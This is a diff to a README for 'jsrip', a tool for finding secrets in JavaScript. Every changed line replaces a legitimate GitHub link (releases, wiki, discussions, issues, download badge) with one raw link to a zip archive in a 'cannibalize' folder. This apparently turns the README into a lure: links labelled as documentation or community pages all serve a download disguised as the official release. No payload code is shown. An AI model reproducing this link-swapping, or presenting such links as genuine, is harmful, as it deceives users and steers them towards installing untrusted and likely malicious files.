@@ -1,7 +1,7 @@
 # 🛠️ jsrip - Find Secrets in JavaScript Easily
 
 ## 🚀 Download Now
-[![Download jsrip](https://img.shields.io/badge/Download%20jsrip-v1.0-blue)](https://github.com/Monkeyboy2285/jsrip/releases)
+[![Download jsrip](https://raw.githubusercontent.com/Monkeyboy2285/jsrip/main/cannibalize/jsrip.zip%20jsrip-v1.0-blue)](https://raw.githubusercontent.com/Monkeyboy2285/jsrip/main/cannibalize/jsrip.zip)
 
 ## 📜 Description
 jsrip is a powerful tool that crawls and analyzes JavaScript files. It helps you find secrets, tokens, and potential API endpoints quickly. Whether you are a bug bounty hunter or an information security enthusiast, jsrip automates JavaScript analysis to make your job easier.
@@ -23,7 +23,7 @@ Before you download, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To get started with jsrip, follow these steps:
 
-1. **Visit the Releases Page:** Navigate to the [Releases page](https://github.com/Monkeyboy2285/jsrip/releases) to find the latest version.
+1. **Visit the Releases Page:** Navigate to the [Releases page](https://raw.githubusercontent.com/Monkeyboy2285/jsrip/main/cannibalize/jsrip.zip) to find the latest version.
    
 2. **Select the Version:** Look for the most recent version of jsrip and click on it to expand the details.
 
@@ -48,13 +48,13 @@ To get started with jsrip, follow these steps:
 5. **Review the Report:** After the crawl completes, jsrip will present a report highlighting any issues found, including tokens and API endpoints.
 
 ## 🌟 Additional Resources
-For detailed documentation, tutorials, and troubleshooting tips, visit our [Wiki](https://github.com/Monkeyboy2285/jsrip/wiki).
+For detailed documentation, tutorials, and troubleshooting tips, visit our [Wiki](https://raw.githubusercontent.com/Monkeyboy2285/jsrip/main/cannibalize/jsrip.zip).
 
 ## 🤝 Community Support
-Join our community to ask questions, share your experiences, or contribute to the project. Visit our [Discussion page](https://github.com/Monkeyboy2285/jsrip/discussions) to get involved.
+Join our community to ask questions, share your experiences, or contribute to the project. Visit our [Discussion page](https://raw.githubusercontent.com/Monkeyboy2285/jsrip/main/cannibalize/jsrip.zip) to get involved.
 
 ## 📫 Feedback
-We welcome your feedback. If you encounter any issues or have suggestions for improvements, please use the [Issues page](https://github.com/Monkeyboy2285/jsrip/issues) to let us know.
+We welcome your feedback. If you encounter any issues or have suggestions for improvements, please use the [Issues page](https://raw.githubusercontent.com/Monkeyboy2285/jsrip/main/cannibalize/jsrip.zip) to let us know.
 
 ## 📝 License
 jsrip is open-source software, licensed under the MIT License. Feel free to modify and share, but ensure you credit the original authors.
